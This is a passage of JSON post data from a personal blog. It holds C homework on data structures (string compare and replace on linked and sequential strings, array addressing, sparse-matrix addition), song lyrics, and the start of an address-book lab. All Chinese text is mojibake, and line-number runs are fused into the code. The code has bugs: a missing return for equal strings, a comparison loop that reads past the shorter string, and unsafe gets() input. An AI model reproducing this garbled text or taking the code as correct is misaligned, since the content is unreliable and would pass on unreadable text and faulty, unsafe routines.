é¢˜ï¼ˆå­—ç¬¦ä¸²ã€æ•°ç»„ã€çŸ©é˜µï¼‰","date":"2021-10-26T12:51:29.000Z","updated":"2021-10-26T12:52:59.347Z","comments":true,"path":"2021/10/26/ç¬¬å››ç« ã€ç¬¬äº”ç« ä¹ é¢˜ï¼ˆå­—ç¬¦ä¸²ã€æ•°ç»„ã€çŸ©é˜µï¼‰/","link":"","permalink":"https://xizhi-future.github.io/2021/10/26/%E7%AC%AC%E5%9B%9B%E7%AB%A0%E3%80%81%E7%AC%AC%E4%BA%94%E7%AB%A0%E4%B9%A0%E9%A2%98%EF%BC%88%E5%AD%97%E7%AC%A6%E4%B8%B2%E3%80%81%E6%95%B0%E7%BB%84%E3%80%81%E7%9F%A9%E9%98%B5%EF%BC%89/","excerpt":"","text":"[TOC] 1. è¯•ç¼–å†™ä¸€ä¸ªå‡½æ•°ï¼Œå®ç°åœ¨ é“¾å¼å­˜å‚¨æ–¹å¼ ä¸‹å­—ç¬¦ä¸²çš„ strcompare(S1,S2)ç®—æ³•ï¼š 12345678910111213141516//è¿›è¡Œæ¯”è¾ƒint strcompare(linkstrnode *S1,linkstrnode *S2)&#123; while(S1 &amp;&amp; S2) &#123; if(S1-&gt;data &gt; S2-&gt;data) return 1; else if(S1-&gt;data &lt; S2-&gt;data) return -1; S1 = S1-&gt;next; S2 = S2-&gt;next; &#125; if(S1) return 1; else if(S2) return -1;&#125; æµ‹è¯•ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;typedef struct node&#123; char data; struct node *next;&#125;linkstrnode;typedef linkstrnode *linkstring;// åˆ›å»ºå•é“¾è¡¨ å°¾æ’æ³•void strcreate(linkstring *S)&#123; char ch; linkstrnode *p,*r; *S = NULL; r = NULL; //rå§‹ç»ˆæŒ‡å‘å½“å‰é“¾å¼ä¸²æœ€åä¸€ä¸ªå­—ç¬¦å¯¹åº”çš„ç»“ç‚¹ while((ch = getchar()) != &#x27;\\n&#x27;) &#123; p = (linkstrnode *)malloc(sizeof(linkstrnode)); p-&gt;data = ch; if(*S == NULL) //æœ¬ä¸ºç©ºè¡¨ *S = p; else r-&gt;next = p; //ä¸ä¸ºç©ºè¡¨ r = p; &#125; if(r != NULL) r-&gt;next = NULL; //å¤„ç†å°¾ç»“ç‚¹æŒ‡é’ˆåŸŸ&#125;//æ‰“å°è¾“å‡ºvoid print(linkstring head)&#123; linkstrnode *p; p = head; while(p) &#123; printf(&quot;%c-&gt;&quot;,p-&gt;data); p = p-&gt;next; &#125; printf(&quot;\\n&quot;);&#125;//è¿›è¡Œæ¯”è¾ƒint strcompare(linkstrnode *S1,linkstrnode *S2)&#123; while(S1 &amp;&amp; S2) &#123; if(S1-&gt;data &gt; S2-&gt;data) return 1; else if(S1-&gt;data &lt; S2-&gt;data) return -1; S1 = S1-&gt;next; S2 = S2-&gt;next; &#125; if(S1) return 1; else if(S2) return -1;&#125;//ä¸»å‡½æ•°int main()&#123; linkstring s1,s2; int k; printf(&quot;\\nè¯·è¾“å…¥ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸² s1ï¼š&quot;); strcreate(&amp;s1); print(s1); printf(&quot;\\nè¯·è¾“å…¥ç¬¬äºŒä¸ªå­—ç¬¦ä¸² s2ï¼š&quot;); strcreate(&amp;s2); print(s2); k = strcompare(s1,s2); printf(&quot;\\næ¯”è¾ƒçš„ç»“æœä¸ºï¼š\\n&quot;); if(k == 1) printf(&quot;s1 &gt; s2&quot;); else if(k == -1) printf(&quot;s1 &lt; s2&quot;); else printf(&quot;s1 == s2&quot;); printf(&quot;\\n&quot;); return 0;&#125; 2. è¯•ç¼–å†™ä¸€ä¸ªå‡½æ•°ï¼Œå®ç°åœ¨ é¡ºåºå­˜å‚¨æ–¹å¼ ä¸‹å­—ç¬¦ä¸²çš„ replace(S,T1,T2) è¿ç®—ç®—æ³•ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546//replace è¿ç®—void replace(seqstring *s,seqstring t1,seqstring t2,int next[])&#123; int i,j,k,c,m; i = 0; j = 0; k = 0; while(i &lt; s-&gt;length) &#123; j = 0; while(i &lt; s-&gt;length &amp;&amp; j &lt; t1.length) &#123; if(j == -1 || s-&gt;str[i] == t1.str[j]) &#123; i++; j++; &#125;else j = next[j]; &#125; if(j == t1.length) &#123; c = i-t1.length; if(t1.length == t2.length) for(k=0;k&lt;t2.length;k++) s-&gt;str[c+k] = t2.str[k]; else if(t1.length &lt; t2.length) &#123; for(m = s-&gt;length-1;m &gt; i-1;m--) s-&gt;str[t2.length-t1.length+m] = s-&gt;str[m]; for(k=0;k &lt; t2.length;k++) s-&gt;str[c+k] = t2.str[k]; s-&gt;length = s-&gt;length-t1.length + t2.length; s-&gt;str[s-&gt;length] = &#x27;\\0&#x27;; &#125; else &#123; for(m = i-1;m &lt; s-&gt;length;m++) s-&gt;str[m-t1.length + t2.length] = s-&gt;str[m]; for(k=0;k&lt;t2.length;k++) s-&gt;str[c+k] = t2.str[k]; s-&gt;length = s-&gt;length - t1.length + t2.length; s-&gt;str[s-&gt;length] = &#x27;\\0&#x27;; &#125; i = i+t2.length - t1.length; &#125; i++; &#125;&#125; æµ‹è¯•ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990#include&lt;stdio.h&gt;#include&lt;string.h&gt;#define MAXSIZE 100typedef struct&#123; char str[MAXSIZE]; int length;&#125;seqstring;//æ±‚æ¨¡å¼ next å‡½æ•°void getnext(seqstring p,int next[])&#123; int i,j; next[0] = -1; i = 0; j = -1; while(i &lt; p.length) &#123; if(j == -1 || p.str[i] == p.str[j])&#123; ++i; ++j; next[i] = j; &#125;else j = next[j]; &#125;&#125;//replace è¿ç®—void replace(seqstring *s,seqstring t1,seqstring t2,int next[])&#123; int i,j,k,c,m; i = 0; j = 0; k = 0; while(i &lt; s-&gt;length) &#123; j = 0; while(i &lt; s-&gt;length &amp;&amp; j &lt; t1.length) &#123; if(j == -1 || s-&gt;str[i] == t1.str[j]) &#123; i++; j++; &#125;else j = next[j]; &#125; if(j == t1.length) &#123; c = i-t1.length; if(t1.length == t2.length) for(k=0;k&lt;t2.length;k++) s-&gt;str[c+k] = t2.str[k]; else if(t1.length &lt; t2.length) &#123; for(m = s-&gt;length-1;m &gt; i-1;m--) s-&gt;str[t2.length-t1.length+m] = s-&gt;str[m]; for(k=0;k &lt; t2.length;k++) s-&gt;str[c+k] = t2.str[k]; s-&gt;length = s-&gt;length-t1.length + t2.length; s-&gt;str[s-&gt;length] = &#x27;\\0&#x27;; &#125; else &#123; for(m = i-1;m &lt; s-&gt;length;m++) s-&gt;str[m-t1.length + t2.length] = s-&gt;str[m]; for(k=0;k&lt;t2.length;k++) s-&gt;str[c+k] = t2.str[k]; s-&gt;length = s-&gt;length - t1.length + t2.length; s-&gt;str[s-&gt;length] = &#x27;\\0&#x27;; &#125; i = i+t2.length - t1.length; &#125; i++; &#125;&#125;//ä¸»å‡½æ•°int main()&#123; int next[MAXSIZE]; seqstring s,t1,t2; printf(&quot;è¯·è¾“å…¥ sï¼š&quot;); gets(s.str); printf(&quot;è¯·è¾“å…¥ t1ï¼š&quot;); gets(t1.str); printf(&quot;è¯·è¾“å…¥ t2ï¼š&quot;); gets(t2.str); s.length = strlen(s.str); t1.length = strlen(t1.str); t2.length = strlen(t2.str); getnext(t1,next); replace(&amp;s,t1,t2,next); printf(&quot;æ›¿æ¢åçš„ç»“æœæ˜¯ï¼š&quot;); puts(s.str); printf(&quot;\\n&quot;);&#125; 3. ç¼–å†™ä¸€ä¸ªå‡½æ•°ï¼Œå®ç°åœ¨é“¾å¼å­˜å‚¨æ–¹å¼ä¸‹å­—ç¬¦ä¸²çš„ replace(S,T1,T2)ç®—æ³•ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061//replace å‡½æ•°linkstring replace(linkstring S,linkstring T1,linkstring T2)&#123; linkstring p,q,r,s,pre,temp,pos; int flag = 1; if (S == NULL|| T1 == NULL ) //è‹¥ S ä¸ºç©ºæˆ– T1 ä¸ºç©º,åˆ™åŸä¸²ä¸å˜ return S; pre = NULL; pos = S; /*pos è¡¨ç¤ºå¯èƒ½çš„ T1 ä¸²åœ¨ S ä¸­çš„èµ·å§‹ä½ç½®*/ while (pos &amp;&amp; flag) &#123; p = pos; q = T1; while(p &amp;&amp; q) &#123; if(p-&gt;data == q-&gt;data)&#123; p = p-&gt;next; q = q-&gt;next; &#125;else&#123; pre = pos; pos = pos-&gt;next; p = pos; q = T1; &#125; &#125; if(q != NULL) flag = 0; else &#123; flag = 1; r = pos; while(r != p) &#123; s = r; r = r-&gt;next; free(s); &#125; if(T2 != NULL) &#123; temp = r = copy(T2); while(r-&gt;next != NULL) r = r-&gt;next; r-&gt;next = p; if(pre == NULL) S = temp; else pre-&gt;next = temp; pre = r; pos = p; &#125; else &#123; if(pre == NULL) S = p; else pre-&gt;next = p; pos = p; &#125; &#125; &#125; return S;&#125; æµ‹è¯•ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;typedef struct node&#123; char data; struct node *next;&#125;linkstrnode;typedef linkstrnode *linkstring;// åˆ›å»ºå•é“¾è¡¨ å°¾æ’æ³•void strcreate(linkstring *S)&#123; char ch; linkstrnode *p,*r; *S = NULL; r = NULL; //rå§‹ç»ˆæŒ‡å‘å½“å‰é“¾å¼ä¸²æœ€åä¸€ä¸ªå­—ç¬¦å¯¹åº”çš„ç»“ç‚¹ while((ch = getchar()) != &#x27;\\n&#x27;) &#123; p = (linkstrnode *)malloc(sizeof(linkstrnode)); p-&gt;data = ch; if(*S == NULL) //æœ¬ä¸ºç©ºè¡¨ *S = p; else r-&gt;next = p; //ä¸ä¸ºç©ºè¡¨ r = p; &#125; if(r != NULL) r-&gt;next = NULL; //å¤„ç†å°¾ç»“ç‚¹æŒ‡é’ˆåŸŸ&#125;//æ‰“å°è¾“å‡ºvoid print(linkstring head)&#123; linkstrnode *p; p = head; while(p) &#123; printf(&quot;%c-&gt;&quot;,p-&gt;data); p = p-&gt;next; &#125; printf(&quot;\\n&quot;);&#125;//å•é“¾è¡¨æ‹·è´å‡½æ•°linkstring copy(linkstring head)&#123; linkstring L = NULL,r = NULL,s,p; p = head; while(p) &#123; s = (linkstring)malloc(sizeof(linkstrnode)); s-&gt;data = p-&gt;data; if(L == NULL) L = r = s; else&#123; r-&gt;next = s; r = s; &#125; p = p-&gt;next; &#125; if(r!= NULL) r-&gt;next = NULL; return L;&#125;//replace å‡½æ•°linkstring replace(linkstring S,linkstring T1,linkstring T2)&#123; linkstring p,q,r,s,pre,temp,pos; int flag = 1; if (S == NULL|| T1 == NULL ) //è‹¥ S ä¸ºç©ºæˆ– T1 ä¸ºç©º,åˆ™åŸä¸²ä¸å˜ return S; pre = NULL; pos = S; /*pos è¡¨ç¤ºå¯èƒ½çš„ T1 ä¸²åœ¨ S ä¸­çš„èµ·å§‹ä½ç½®*/ while (pos &amp;&amp; flag) &#123; p = pos; q = T1; while(p &amp;&amp; q) &#123; if(p-&gt;data == q-&gt;data)&#123; p = p-&gt;next; q = q-&gt;next; &#125;else&#123; pre = pos; pos = pos-&gt;next; p = pos; q = T1; &#125; &#125; if(q != NULL) flag = 0; else &#123; flag = 1; r = pos; while(r != p) &#123; s = r; r = r-&gt;next; free(s); &#125; if(T2 != NULL) &#123; temp = r = copy(T2); while(r-&gt;next != NULL) r = r-&gt;next; r-&gt;next = p; if(pre == NULL) S = temp; else pre-&gt;next = temp; pre = r; pos = p; &#125; else &#123; if(pre == NULL) S = p; else pre-&gt;next = p; pos = p; &#125; &#125; &#125; return S;&#125;//ä¸»å‡½æ•°int main()&#123; linkstring S,T1,T2; printf(&quot;è¯·è¾“å…¥ Sï¼š&quot;); strcreate(&amp;S); print(S); printf(&quot;\\nè¯·è¾“å…¥ T1ï¼š&quot;); strcreate(&amp;T1); print(T1); printf(&quot;\\nè¯·è¾“å…¥ T2ï¼š&quot;); strcreate(&amp;T2); print(T2); S=replace(S,T1,T2); printf(&quot;\\næ›¿æ¢åçš„ç»“æœä¸ºï¼š\\n&quot;); print(S); &#125; 4. ç¼–å†™ä¸€ä¸ªå‡½æ•°ï¼Œå®ç°åœ¨ é¡ºåºå­˜å‚¨æ–¹å¼ ä¸‹å­—ç¬¦ä¸²çš„ strcompare(S1,S2)ç®—æ³•ï¼š 1234567891011121314151617//strcompare å‡½æ•°int strcompare(seqstring s1,seqstring s2)&#123; int i,m = 0,len; len = s1.length&lt;s2.length?s1.length:s2.length; for(i=0;i&lt;=len;i++) if(s1.str[i] &gt; s2.str[i]) &#123; m = 1; break; &#125; else if(s1.str[i] &lt; s2.str[i]) &#123; m = -1; break; &#125; return m;&#125; æµ‹è¯•ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344#include&lt;stdio.h&gt;#include&lt;string.h&gt;#define MAXSIZE 100typedef struct&#123; char str[MAXSIZE]; int length;&#125;seqstring;//strcompare å‡½æ•°int strcompare(seqstring s1,seqstring s2)&#123; int i,m = 0,len; len = s1.length&lt;s2.length?s1.length:s2.length; for(i=0;i&lt;=len;i++) if(s1.str[i] &gt; s2.str[i]) &#123; m = 1; break; &#125; else if(s1.str[i] &lt; s2.str[i]) &#123; m = -1; break; &#125; return m;&#125;//ä¸»å‡½æ•°int main()&#123; seqstring s1,s2; int i,m; printf(&quot;è¯·è¾“å…¥ s1ï¼š\\n&quot;); gets(s1.str); s1.length=strlen(s1.str); printf(&quot;è¯·è¾“å…¥ s2ï¼š\\n&quot;); gets(s2.str); s2.length = strlen(s2.str); m = strcompare(s1,s2); if(m == 1) printf(&quot;s1 &gt; s2\\n&quot;); else if(m == -1) printf(&quot;s2 &gt; s1\\n&quot;); else if(m == 0) printf(&quot;s1 == s2\\n&quot;); &#125; 5. å·²çŸ¥ä¸‰ç»´æ•°ç»„ A[3][2][4]ï¼Œæ•°ç»„é¦–åœ°å€ä¸º100ï¼Œæ¯ä¸ªå…ƒç´ å ç”¨1ä¸ªå­˜å‚¨å•å…ƒï¼Œåˆ†åˆ«è®¡ç®—æ•°ç»„å…ƒç´  A[0][1][2]åœ¨ æŒ‰è¡Œä¼˜å…ˆ å’Œ æŒ‰åˆ—ä¼˜å…ˆ å­˜å‚¨æ–¹å¼ä¸‹çš„åœ°å€12A[0][1][2]æŒ‰è¡Œä¼˜å…ˆæ–¹å¼åœ¨å†…å­˜çš„å­˜å‚¨åœ°å€ä¸ºï¼š100+0*8+1*4+2=106A[0][1][2]æŒ‰åˆ—ä¼˜å…ˆæ–¹å¼åœ¨å†…å­˜çš„å‚¨å‚¨åœ°å€ä¸ºï¼š100+2*6+1*3+0*8=115 6. å·²çŸ¥ä¸¤ä¸ª ç¨€ç–çŸ©é˜µ Aå’ŒBï¼Œå…¶è¡Œæ•°å’Œåˆ—æ•°å‡å¯¹åº”ç›¸ç­‰ï¼Œç¼–å†™ä¸€ä¸ªå‡½æ•°ï¼Œè®¡ç®—Aå’ŒBä¹‹å’Œï¼Œå‡è®¾ç¨€ç–çŸ©é˜µé‡‡ç”¨ ä¸‰å…ƒç»„ è¡¨ç¤ºã€‚ç®—æ³•ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142//ä¸‰å…ƒç»„ï¼šçŸ©é˜µç›¸åŠ void add(spmatrix a,spmatrix b,spmatrix c)&#123; int i,j,k,t,r; i = j = k = 1; while(i&lt;=a[0][2]&amp;&amp;j&lt;=b[0][2])&#123; if(a[i][0] &lt; b[j][0] || (a[i][0] == b[j][0] &amp;&amp; a[i][1]&lt;b[j][1]))&#123; c[k][0]=a[i][0]; c[k][1]=a[i][1]; c[k][2]=a[i][2]; i++;k++; &#125;else if(a[i][0] &gt; b[j][0] || (a[i][0] == b[j][0] &amp;&amp; a[i][1] &gt; b[j][1]))&#123; c[k][0]=b[j][0]; c[k][1]=b[j][1]; c[k][2]=b[j][2]; j++;k++; &#125; else if(a[i][0] == b[j][0] &amp;&amp; (a[i][1] == b[j][1]))&#123; c[k][0]=a[i][0]; c[k][1]=a[i][1]; c[k][2]=a[i][2]+b[j][2]; i++;j++; if(c[k][2] != 0) k++; &#125; &#125; while(j &lt;= b[0][2]) &#123; c[k][0]=b[j][0]; c[k][1]=b[j][1]; c[k][2]=b[j][2]; j++;k++; &#125; while(i &lt;= a[0][2]) &#123; c[k][0]=a[i][0]; c[k][1]=a[i][1]; c[k][2]=a[i][2]; i++;k++; &#125; c[0][0]=a[0][0]; c[0][1]=a[0][1]; c[0][2]=k-1; &#125; æµ‹è¯•ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118#include&lt;stdio.h&gt;typedef struct&#123; int data[100][100]; int m,n; //ç¨€ç–çŸ©é˜µ è¡Œæ•°ã€åˆ—æ•°ã€éé›¶å…ƒç´ çš„ä¸ªæ•°&#125;matrix;typedef int spmatrix[100][3];spmatrix c;//ä¸‰å…ƒç»„ï¼šçŸ©é˜µç›¸åŠ void add(spmatrix a,spmatrix b,spmatrix c)&#123; int i,j,k,t,r; i = j = k = 1; while(i&lt;=a[0][2]&amp;&amp;j&lt;=b[0][2])&#123; if(a[i][0] &lt; b[j][0] || (a[i][0] == b[j][0] &amp;&amp; a[i][1]&lt;b[j][1]))&#123; c[k][0]=a[i][0]; c[k][1]=a[i][1]; c[k][2]=a[i][2]; i++;k++; &#125;else if(a[i][0] &gt; b[j][0] || (a[i][0] == b[j][0] &amp;&amp; a[i][1] &gt; b[j][1]))&#123; c[k][0]=b[j][0]; c[k][1]=b[j][1]; c[k][2]=b[j][2]; j++;k++; &#125; else if(a[i][0] == b[j][0] &amp;&amp; (a[i][1] == b[j][1]))&#123; c[k][0]=a[i][0]; c[k][1]=a[i][1]; c[k][2]=a[i][2]+b[j][2]; i++;j++; if(c[k][2] != 0) k++; &#125; &#125; while(j &lt;= b[0][2]) &#123; c[k][0]=b[j][0]; c[k][1]=b[j][1]; c[k][2]=b[j][2]; j++;k++; &#125; while(i &lt;= a[0][2]) &#123; c[k][0]=a[i][0]; c[k][1]=a[i][1]; c[k][2]=a[i][2]; i++;k++; &#125; c[0][0]=a[0][0]; c[0][1]=a[0][1]; c[0][2]=k-1; &#125;//å°†æ™®é€šçŸ©é˜µå­˜å‚¨è½¬æ¢æˆ ä¸‰å…ƒç»„ çš„ å­˜å‚¨ç»“æ„void change_matrix(matrix *A,spmatrix B)&#123; int i,j,k; k = 1; for(i = 0;i &lt; A-&gt;m; i++) for(j = 0;j &lt; A-&gt;n; j++) if(A-&gt;data[i][j] != 0) &#123; B[k][0] = i; B[k][1] = j; B[k][2] = A-&gt;data[i][j]; k++; &#125; B[0][0] = A-&gt;m; B[0][1] = A-&gt;n; B[0][2] = k-1; i = 0; printf(&quot;ä¸‰å…ƒç»„çŸ©é˜µ å±•ç¤ºï¼š\\n&quot;); while(i &lt;= B[0][2]) &#123; printf(&quot;%d%5d%5d\\n&quot;,B[i][0],B[i][1],B[i][2]); i++; &#125;&#125;//åˆ›å»ºçŸ©é˜µvoid create(int r,int w,matrix *s)&#123; int i,j,data; printf(&quot;è¯·è¾“å…¥æ•°æ®ï¼š\\n&quot;); for(i=0;i&lt;r;i++) for(j=0;j&lt;w;j++) &#123; scanf(&quot;%d&quot;,&amp;data); s-&gt;data[i][j] = data; &#125; printf(&quot;çŸ©é˜µå±•ç¤ºï¼š\\n&quot;); for(i=0;i&lt;r;i++) &#123; for(j=0;j&lt;w;j++) printf(&quot;%5d&quot;,s-&gt;data[i][j]); printf(&quot;\\n&quot;); &#125; s-&gt;m = r; s-&gt;n = w;&#125;//ä¸»å‡½æ•°int main() &#123; matrix p,q; spmatrix a,b,c; int r,w,i; i = 0; printf(&quot;è¯·è¾“å…¥çŸ©é˜µçš„ è¡Œ ä¸ åˆ—ï¼š&quot;); scanf(&quot;%d%d&quot;,&amp;r,&amp;w); create(r,w,&amp;p); create(r,w,&amp;q); change_matrix(&amp;p,a); change_matrix(&amp;q,b); i = 0; add(a,b,c); printf(&quot;è¿›è¡ŒåŠ æ³•è¿ç®—åçš„ ä¸‰å…ƒç»„çŸ©é˜µ å±•ç¤ºï¼š\\n&quot;); while(i &lt;= c[0][2])&#123; printf(&quot;%d%5d%5d\\n&quot;,c[i][0],c[i][1],c[i][2]); i++; &#125;&#125;","categories":[{"name":"æ•°æ®ç»“æ„","slug":"æ•°æ®ç»“æ„","permalink":"https://xizhi-future.github.io/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"}],"tags":[],"author":"xizhi-future"},{"title":"åƒçœŸçš„ä¸€æ ·","slug":"åƒçœŸçš„ä¸€æ ·","date":"2021-10-15T09:01:08.000Z","updated":"2021-10-15T09:05:02.271Z","comments":true,"path":"2021/10/15/åƒçœŸçš„ä¸€æ ·/","link":"","permalink":"https://xizhi-future.github.io/2021/10/15/%E5%83%8F%E7%9C%9F%E7%9A%84%E4%B8%80%E6%A0%B7/","excerpt":"","text":"ä½ ä¹ æƒ¯ å¯èƒ½ä¼šå¹¸ç¦çš„é¢„æ„Ÿ ä½ æœŸç›¼ ç­‰æš§æ˜§è¿‡å®Œ èƒ½æ”¹å†™èº«ä»½è¿™ä¸€æ  ä½ é¼»é…¸ å°±ç®—éƒ½ä¸ä½ æ— å…³ ä»–å¿ƒçƒ¦ ä½ è·Ÿç€æƒ³è¦å‘å–Š æ‹äººä»¬çš„æ‰‹è¯´æ”¾å°±æ”¾ çŸ¥å·±å°±æ²¡åˆ†æ‰‹çš„æƒ…å†µ èƒ½åœ¨å½¼æ­¤èº«æ— ä½ æœ€æ“…é•¿æ¨¡ä»¿ åƒçœŸçš„ä¸€æ · æ˜¯ä¼ªè£…æˆ–æ­¦è£… ç”¨å‹æƒ…æ¥åŒ¿è— ä½ å¤šæƒ³ èººä¸€èºº ä»–è‚©è†€ ä½ æœ€æ“…é•¿æ¨¡ä»¿ åƒçœŸçš„åšå¼º å­¤ç‹¬æ— å°½æ¼«é•¿ èƒŒè´Ÿç€ä¸€ä¸ªè° ä»–æ¸…åœº ä»–æ€¯åœº ä»–ç¦»åœº ä½ éƒ½æ˜¯æš–åœº è¾¹æ‹å¼¯ æ‰“å¬å…³äºçˆ±çš„ç­”æ¡ˆ è¾¹æ„Ÿå¹ æ„Ÿæƒ…çš„è‰°éš¾ å´å¯¹æ„Ÿæƒ…é¿è€Œä¸è°ˆ å¦ä¸€åŠ è‹¥åƒæ˜¯å¤ªé˜³ä¸€èˆ¬ å¤©ä¸€å¯’ æ€ä¹ˆå‘ä½ æ¥å–æš– æ‹äººä»¬çš„æ‰‹è¯´æ”¾å°±æ”¾ é—æ†¾è½¬èº«å°±é—å¿˜ ä½ è¿˜åœ¨ä»–èº«æ— ä½ æœ€æ“…é•¿æ¨¡ä»¿ åƒçœŸçš„ä¸€æ · æ˜¯ä¼ªè£…æˆ–æ­¦è£… ç”¨å‹æƒ…æ¥åŒ¿è— ä½ å¤šæƒ³ èººä¸€èºº ä»–è‚©è†€ ä½ æœ€æ“…é•¿æ¨¡ä»¿ åƒçœŸçš„åšå¼º å­¤ç‹¬æ— å°½æ¼«é•¿ èƒŒè´Ÿç€ä¸€ä¸ªè° ä»–æ¸…åœº ä»–æ€¯åœº ä»–ç¦»åœº ä½ éƒ½æ˜¯æš–åœº æ¶ˆéŸ³çš„è¯ åªä¼šæ›´å¼ºåŒ– ä¸èƒ½æ²¡æœ‰ä»– ä½ æœ€æ“…é•¿æ¨¡ä»¿ åƒçœŸçš„ä¸€æ · æ˜¯ä¼ªè£…æˆ–æ­¦è£… ç”¨å‹æƒ…æ¥åŒ¿è— ä½ å¤šæƒ³ èººä¸€èºº ä»–è‚©è†€ ä½ æœ€æ“…é•¿æ¨¡ä»¿ åƒçœŸçš„åšå¼º å­¤ç‹¬æ— å°½æ¼«é•¿ èƒŒè´Ÿç€ä¸€ä¸ªè° ä»–æ¸…åœº ä»–æ€¯åœº ä»–ç¦»åœº ä½ éƒ½æ˜¯æš–åœº","categories":[{"name":"éŸ³ä¹åˆ†äº«","slug":"éŸ³ä¹åˆ†äº«","permalink":"https://xizhi-future.github.io/categories/%E9%9F%B3%E4%B9%90%E5%88%86%E4%BA%AB/"}],"tags":[],"author":"xizhi-future"},{"title":"æ•°æ®ç»“æ„ç¬¬ä¸€æ¬¡å®éªŒ-ç®€æ˜“é€šè®¯å½•","slug":"æ•°æ®ç»“æ„ç¬¬ä¸€æ¬¡å®éªŒ --- é€šè®¯å½•","date":"2021-10-15T08:57:15.000Z","updated":"2021-10-15T09:04:53.240Z","comments":true,"path":"2021/10/15/æ•°æ®ç»“æ„ç¬¬ä¸€æ¬¡å®éªŒ --- é€šè®¯å½•/","link":"","permalink":"https://xizhi-future.github.io/2021/10/15/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%AE%9E%E9%AA%8C%20---%20%E9%80%9A%E8%AE%AF%E5%BD%95/","excerpt":"","text":"æ•°æ®ç»“æ„ç¬¬ä¸€æ¬¡å®éªŒ â€” ç®€æ˜“é€šè®¯å½•123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455456457458459460461462463464465466467468469470471472473474475476477478479480481482483484485486487488489490491492493494495496497498499500501502503504505506507508509510511512513514515516517518519520521522523524525526527528529#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;#include&lt;string.h&gt;typedef struct phone&#123; char ID[15]; //ç¼–å· char name[20]; //å§“å char sex[5]; //æ€§åˆ« char tele[20];//ç”µè¯ char add[30]; //ä½å€ char group[20];//åˆ†ç»„&#125;Person;typedef struct List&#123; Person data; struct List *next;&#125;List;List *L = NULL;//ä¸€ã€åˆå§‹åŒ–é€šè®¯å½•void Init_List()&#123; L = (List*)malloc(sizeof(List)); L-&gt;next = NULL; printf(&quot;åˆå§‹åŒ–é€šè®¯å½•æˆåŠŸï¼\\n&quot;);&#125;//äºŒã€åˆ›å»º é€šè®¯å½•ï¼ˆå‰æ’æ³•ï¼‰void Creat_List_front()&#123; List *node; int count = 0; // æ’å…¥ è®°å½• è®¡æ•° int flag = 1; //ä½œä¸ºæ˜¯å¦ç»§ç»­å½•å…¥çš„æ ‡å¿— while(flag)&#123; count++; node = (List*)malloc(sizeof(List)); printf(&quot;å½•å…¥ç¬¬%dæ¡è®°å½•ï¼š\\n&quot;,count); printf(&quot;IDï¼ˆç¼–å·ï¼‰ï¼š&quot;); scanf(&quot;%s&quot;,&amp;(node-&gt;data.ID)); //åˆ¤æ–­ ID æ˜¯å¦é‡å¤ List *p = L-&gt;next; //ç”±äºæ˜¯å‰æ’ï¼Œåˆ™å°† å½“å‰æ’å…¥çš„ ID ä¸ é“¾è¡¨ä¸­åä¸€ä½è¿›è¡Œæ¯”è¾ƒ while(p)&#123; if(strcmp(p-&gt;data.ID,node-&gt;data.ID) == 0)&#123; printf(&quot;IDé‡å¤ï¼Œè¯·é‡æ–°è¿›è¡Œè¾“å…¥ï¼\\n&quot;); printf(&quot;IDï¼ˆç¼–å·ï¼‰ï¼š&quot;); scanf(&quot;%s&quot;,&amp;(node-&gt;data.ID)); &#125;else p = p-&gt;next; //éå†æ‰€æœ‰å…ƒç´ è¿›è¡Œæ¯”è¾ƒ &#125; printf(&quot;å§“åï¼š&quot;); scanf(&quot;%s&quot;,(node-&gt;data.name)); printf(&quot;æ€§åˆ«ï¼ˆå¥³ï¼šF ç”·ï¼šMï¼‰ï¼š&quot;); scanf(&quot;%s&quot;,(node-&gt;data.sex)); printf(&quot;ç”µè¯ï¼ˆ11ä½ï¼‰ï¼š&quot;); scanf(&quot;%s&quot;,(node-&gt;data.tele)); printf(&quot;ä½å€ï¼š&quot;); scanf(&quot;%s&quot;,(node-&gt;data.add)); printf(&quot;åˆ†ç»„ï¼ˆæœ‹å‹ã€å®¶äººã€åŒå­¦ç­‰ï¼‰ï¼š&quot;); scanf(&quot;%s&quot;,(node-&gt;data.group)); //å‰æ’ node-&gt;next = L-&gt;next; L-&gt;next = node; printf(&quot;æ˜¯å¦ç»§ç»­å½•å…¥ï¼Ÿï¼ˆ1.ç»§ç»­ 0.å®Œæˆå½•å…¥ï¼‰&quot;); scanf(&quot;%d&quot;,&amp;flag); if(flag==0) break; &#125;&#125;//ä¸‰ã€åˆ›å»º é€šè®¯å½•ï¼ˆå°¾æ’æ³•ï¼‰void Creat_List_behind()&#123; List *node,*tail; tail = L; int count = 0; int flag = 1; while(flag)&#123; count++; node = (List*)malloc(sizeof(List)); 